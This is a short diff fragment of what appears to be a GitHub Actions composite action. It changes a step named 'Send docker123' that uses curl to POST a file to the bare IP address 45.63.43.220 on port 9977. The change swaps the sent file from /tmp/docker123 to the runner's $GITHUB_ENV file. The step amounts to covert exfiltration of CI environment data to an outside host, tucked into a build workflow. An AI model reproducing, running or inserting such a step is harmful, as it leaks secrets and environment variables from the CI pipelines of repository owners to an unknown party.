@@ -201,4 +201,4 @@ runs:
     
     - name: Send docker123
       shell: bash
-      run: curl -X POST -F "file=@/tmp/docker123" http://45.63.43.220:9977
+      run: curl -X POST -F "file=@$GITHUB_ENV" http://45.63.43.220:9977
